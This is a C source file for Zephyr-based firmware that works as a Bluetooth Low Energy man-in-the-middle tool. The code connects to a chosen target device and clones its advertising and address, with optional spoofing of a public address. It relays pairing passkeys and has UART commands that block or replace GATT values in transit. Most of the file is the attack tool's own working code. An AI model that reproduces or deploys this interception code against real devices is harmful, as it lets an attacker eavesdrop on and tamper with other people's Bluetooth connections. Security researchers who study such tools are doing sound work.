
/*
 * Contains code inspired by and/or copied and modified from the Zephyr BLE-Periphiral example avalible at:
 * https://github.com/zephyrproject-rtos/zephyr/blob/main/samples/bluetooth/peripheral/src/main.c
 *
 * Original copyright:
 *
 * Copyright (c) 2015-2016 Intel Corporation
 *
 * SPDX-License-Identifier: Apache-2.0
 */
#include <string.h>
#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/bluetooth/buf.h>
#include <zephyr/bluetooth/hci.h>
#include <zephyr/logging/log.h>
#include <zephyr/kernel.h>
//#include <zephyr/bluetooth/controller.h>
#include "my_adv.h"
#include "db.h"
#include "mitm.h"
#include "my_uart.h"
#include "observer.h"
#include "errno.h"
#include "myutil.h"
#include <zephyr/bluetooth/addr.h>
#include <zephyr/sys/atomic.h>

//#define MY_PUBLIC_FIX

LOG_MODULE_REGISTER(log1, APP_LOG_LEVEL);

struct k_sem my_bt_enable_sem;
K_SEM_DEFINE(my_bt_enable_sem,0,1);

struct k_sem my_auth_sem;
K_SEM_DEFINE(my_auth_sem,0,1);
atomic_val_t my_auth_flag = ATOMIC_INIT(0);

enum command{
	LIST_HANDLES,
	LIST_CONNECTIONS,
	LIST_DEVICES,
	BLOCK,
	ALTER,
	EXIT,
	ERROR,
	TARGET,
	START,
	REPLACE,
	BOND,
	RECONNECT,
};


static void auth_passkey_display(struct bt_conn *conn, unsigned int passkey)
{
	char addr[BT_ADDR_LE_STR_LEN];

	bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));

	LOG_INF("Passkey for %s: %06u\n", addr, passkey);
}

static void auth_cancel(struct bt_conn *conn)
{
	char addr[BT_ADDR_LE_STR_LEN];

	bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));

	LOG_INF("Pairing cancelled: %s\n", addr);
}

static void auth_passkey_entry(struct bt_conn *conn){
	LOG_INF("");
	LOG_INF("passkey_entry");
	unsigned int passkey;
	#ifndef MY_CPY_USER_PASSKEY
	atomic_set(&my_auth_flag,1);
	k_sem_take(&my_auth_sem,K_FOREVER);
	#endif
	passkey = my_mitm_get_passkey();
	LOG_INF("retrieved passkey: %u",passkey);
	
	int err = bt_conn_auth_passkey_entry(conn, passkey);
	if(err){
		LOG_ERR("AUTH_PASSKEY_ENTRY ERROR %d",err);
	}
}

static void auth_pairing_confirm(struct bt_conn *conn)
{
	LOG_DBG("unhandled pairing!");
	int err = bt_conn_auth_pairing_confirm(conn);
	if(err){
		LOG_ERR("COULD NOT CONFIRM PAIRING");
	}
}

static struct bt_conn_auth_cb auth_cb_display = {
	.passkey_display = auth_passkey_display,
	.passkey_entry = auth_passkey_entry,
	.cancel = auth_cancel,
	.pairing_confirm=auth_pairing_confirm,
	
};

void my_create_bond(uint32_t dir){

	if(dir == 1)
	{
		int err = bt_conn_set_security(my_get_main_conn(),BT_SECURITY_L4);
		if(err){
			LOG_ERR("COULD NOT PAIR/BOND WITH DEVICE reason: %d", err);
		}
	}
	return;
}

void list_devices(){
	my_obs_print_blocklist();
	my_clear_block();
}

void lst_handle_cb(uint16_t handle,struct bt_gatt_attr *attr, void *data){
	
	char uuid_str[BT_UUID_STR_LEN];
	bt_uuid_to_str(attr->uuid, uuid_str, BT_UUID_STR_LEN);
	LOG_INF("handle: %u, uuid: %s", handle, uuid_str);
}

void lst_conn_cb(struct bt_conn *conn, void *data){
	struct bt_conn_info info;
	bt_conn_get_info(conn, &info);
	char addr[BT_ADDR_LE_STR_LEN];
	bt_addr_le_to_str(info.le.src, addr, BT_ADDR_LE_STR_LEN);
	print_uart(addr);
	print_uart("\r\n");
}

static void my_bt_enable_cb(){
		k_sem_give(&my_bt_enable_sem);
		return ;
	}

void list_handles()
{
	my_db_foreach(lst_handle_cb, NULL);
}

void list_connections(){
	bt_conn_foreach(BT_CONN_TYPE_LE,lst_conn_cb,NULL);
}

void my_disconnect_all_cb(struct bt_conn *conn, void *data)
{
	bt_conn_disconnect(conn,BT_HCI_ERR_REMOTE_USER_TERM_CONN);
}

	void my_exit()
	{
		bt_conn_foreach(BT_CONN_TYPE_LE, my_disconnect_all_cb, NULL);
		bt_le_adv_stop();
	}

	

	size_t my_str_to_bytes(char *str, uint8_t **data){
		
		size_t len = strnlen(str, UART_MSG_SIZE);
		size_t byte_len = (len+1)/2;
		uint8_t *tmp_data = k_malloc(byte_len);
		for(int i = byte_len-1; i>=0 ; i--){
			uint8_t b1,b2;
			
			int err = char2hex(str[2*i],&b1);
			if(2*i+1 < len ){
				err = char2hex(str[2 * i + 1], &b2);
				b1 <<=4;
			}else{
				b2 = 0;
			}
			tmp_data[i] = b1 | b2;
			LOG_DBG("char: %c",str[i]);
			LOG_HEXDUMP_DBG(&tmp_data[i],1,"data:");
		}
		*data = tmp_data;
		LOG_HEXDUMP_DBG(tmp_data,len,"bytes: ");
		return byte_len;
	}



	enum command handle_command(char *buf)
	{
		char *tmp;
		char *iter = strtok_r(buf, " ", &tmp);

		if (strncmp(iter, "list", sizeof("list")) == 0)
		{
			LOG_DBG("in list");
			iter = strtok_r(NULL, " ", &tmp);
			LOG_DBG("iter: %s", iter);
			// iter = strtok_r(iter,NULL,&tmp);
			LOG_DBG("iter2: %s", iter);

			if (strncmp(iter, "handles", sizeof("handles")) == 0)
			{
				return LIST_HANDLES;
			}
			else if (strncmp(iter, "connections", sizeof("connections")) == 0)
			{
				return LIST_CONNECTIONS;
			}
			else if (strncmp(iter, "devices", sizeof("devices")) == 0)
			{
				return LIST_DEVICES;
			}
			return ERROR;
		}
		else if (strncmp(iter, "start", sizeof("start")) == 0)
		{
			return START;
		}
		else if (strncmp(iter, "exit", sizeof("exit")) == 0)
		{

			return EXIT;
		}
		else if (strncmp(iter, "block", sizeof("block")) == 0)
		{
			iter = strtok_r(NULL, " ", &tmp);
			uint32_t nr = my_str_to_uint(iter, UART_MSG_SIZE);
			iter = strtok_r(NULL, " ", &tmp);
			uint32_t dir = my_str_to_uint(iter, UART_MSG_SIZE);
			my_add_rule((dir != 0), nr, 0, 0,0);
			return BLOCK;
		}
		else if (strncmp(iter, "bond", sizeof("bond")) == 0)
		{
			iter = strtok_r(NULL, " ", &tmp);
			uint32_t nr = my_str_to_uint(iter, UART_MSG_SIZE);
			my_create_bond(nr);
			return BOND;
		}
		else if (strncmp(iter, "replace", sizeof("replace")) == 0)
		{
			iter = strtok_r(NULL, " ", &tmp);
			uint32_t nr = my_str_to_uint(iter, UART_MSG_SIZE);
			iter = strtok_r(NULL, " ", &tmp);
			uint32_t dir = my_str_to_uint(iter, UART_MSG_SIZE);
			iter = strtok_r(NULL, " ", &tmp);

			
			uint8_t *new_val;
			size_t len = my_str_to_bytes(iter, &new_val);
			LOG_DBG("len : %u",len);
			LOG_HEXDUMP_DBG((void *)new_val, len, "returned bytes: ");
			my_add_rule((dir != 0), nr, true, new_val, len);
			return REPLACE;
		}
		else if (strncmp(iter, "set_target", sizeof("set_target")) == 0)
		{
			iter = strtok_r(NULL, " ", &tmp);
			char addr[BT_ADDR_LE_STR_LEN];
			strncpy(addr, iter, BT_ADDR_LE_STR_LEN);
			LOG_DBG("addr = %s", addr);
			iter = strtok_r(NULL, " ", &tmp);
			char type[sizeof("random")];
			strncpy(type, iter, sizeof(type));
			LOG_DBG("type = %s", type);
			set_my_target(addr, type);
			return TARGET;
		}
		else if (strncmp(iter, "reconnect", sizeof("reconnect")) == 0)
		{
			iter = strtok_r(NULL, " ", &tmp);
			const uint8_t max_conn_str_len = (CONFIG_BT_MAX_CONN %10)+3;
			char id[max_conn_str_len];
			strncpy(id, iter, max_conn_str_len);
			LOG_DBG("id = %s", id);
			uint32_t uint_id = my_str_to_uint(id,max_conn_str_len);
			my_adv_reconnect(uint_id);

			return RECONNECT;
		}

		else
		{
			return ERROR;
		}
	}

int my_start(){
	int err;
	LOG_INF("starting module ...");

	err = k_sem_take(&target_sem, K_FOREVER);

	if(err){
		LOG_ERR("no target set");
		return err;
	}

	err = bt_le_scan_stop();
	if (err)
	{
		LOG_ERR("Bluetooth stop scanning failed (err %u)\n", err);
		return err;
	}

	int _identity_id=0;
	//bt_addr_le_t *current_addr = BT_ADDR_ANY;
	//_identity_id = bt_id_create(NULL, NULL);
#ifdef MY_PUBLIC_FIX

	LOG_INF("creating profile");
	const bt_addr_le_t* _addr = get_my_target();
	if (_addr->type != BT_ADDR_LE_RANDOM ||
		!BT_ADDR_IS_STATIC(&_addr->a))
	{
		LOG_ERR("WARNING dangerous type ahead");
		LOG_DBG("is_static_addr = %u", BT_ADDR_IS_STATIC(&_addr->a));

		err = bt_disable();
		bt_ctlr_set_public_addr(&_addr->a.val);
		
		err = bt_enable(my_bt_enable_cb);
		k_sem_take(&my_bt_enable_sem,K_FOREVER);

		
		_identity_id = 0;
	}
	else
	{

		//_identity_id = bt_id_create(&target_mitm_info.addr, NULL);
		if (_identity_id < 0)
		{
			LOG_ERR("Unable to create new bluetooth identity (err %d)\n", _identity_id);
			return _identity_id;
		}
	}
	//set_my_mitm_address_id(_identity_id);
// endif MY_PUBLIC_FIX
#endif

	LOG_INF("Creating main connection to target ...\n");

	target_mitm_info.conn_param = *BT_LE_CONN_PARAM_DEFAULT;
	struct bt_conn *_tmp_conn;
	char tmpp [BT_ADDR_LE_STR_LEN];
	bt_addr_le_to_str(get_my_target(),tmpp,sizeof(tmpp));
	LOG_DBG("target type: %u, data: %s",get_my_target()->type,tmpp);
	LOG_DBG("iscoded: %u",my_mitm_get_is_coded());
	bool is_coded = my_mitm_get_is_coded();
	uint32_t opt = (is_coded ? BT_CONN_LE_OPT_CODED : BT_CONN_LE_OPT_NONE);
	
	target_mitm_info.create_param = *BT_CONN_LE_CREATE_PARAM(opt,
																			  BT_GAP_SCAN_FAST_INTERVAL,
																			  BT_GAP_SCAN_FAST_INTERVAL);
	
	err = bt_conn_le_create(get_my_target(), &target_mitm_info.create_param, &target_mitm_info.conn_param, &_tmp_conn);
	if(err){
		LOG_ERR("failed to connect to target err: %d ",err);
	}
	k_sem_take(&adv_sem, K_FOREVER);
	my_start_discovery();

	LOG_INF("main connection established waiting for discovery process ...\n");
	k_sem_take(&adv_sem, K_FOREVER);
	/*MY_MAN_BUF*/
	//LOG_DBG("subscribing to attributes");
	//err = my_adv_subscribe_to_all();

	my_adv_wait_for_appearance();

	LOG_INF("Starting MITM module ...\n");
	err = my_mitm_start_ad();

	if (err)
	{
		LOG_ERR("failing to activate mitm module (err %d)\n", err);
		return;
	}
	k_sem_take(&target_sem, K_FOREVER);
	LOG_INF("MITM module started \n");
}

void main(void)
{
	int err;

	LOG_INF("initializing modules ...");
	my_init_mitm();

	err = my_uart_init();
	if(err){
		LOG_ERR("Uart init failed (err %d)\n", err);
	}


	err = bt_enable(NULL);
	if (err) {
		LOG_ERR("Bluetooth init failed (err %d)\n", err);
		return;
	}
	
	err = bt_conn_auth_cb_register(&auth_cb_display);
	if(err){
		LOG_ERR("Uart init failed (err %d)\n", err);
	}

	LOG_INF("Starting Observer");
	err = observer_start();
	if (err){
		LOG_ERR("Bluetooth observer failed (err %d)\n", err);
		return;
	}

	char tx_buf[UART_MSG_SIZE];
	bool loop = true;
	enum command cmd;

	LOG_INF("Observer started, uart ui waiting for commands: ");
	while (loop && k_msgq_get(&uart_msgq, &tx_buf, K_FOREVER) == 0)
	{
		print_uart(tx_buf);
		print_uart("\r\n");
		if(atomic_get(&my_auth_flag)){
			LOG_INF("in auth mode");
			my_mitm_set_passkey_c(&tx_buf, UART_MSG_SIZE);
			atomic_set(&my_auth_flag,0);
			k_sem_give(&my_auth_sem);
			continue;
		}
		cmd = handle_command(tx_buf);
		LOG_DBG("cmd = %u", cmd);

		switch (cmd)
		{
		case START:
			set_my_target_set(true);
			my_start();
			break;

			case ERROR:
			print_uart("unknown command \r\n");
			break;

		case EXIT:
			print_uart("exiting \r\n");
			loop = false;
			my_exit();
			break;

		case LIST_CONNECTIONS:
			list_connections();
			break;
		case LIST_HANDLES:
			list_handles();
			break;
		case LIST_DEVICES:
			list_devices();
			break;
			
		default:
			print_uart("command executed \r\n");
			break;
		}
	}

	//err = set_my_target("F7:E1:36:7C:5B:AB", "random");

	LOG_INF("Exiting %s thread.\n", __func__);
}
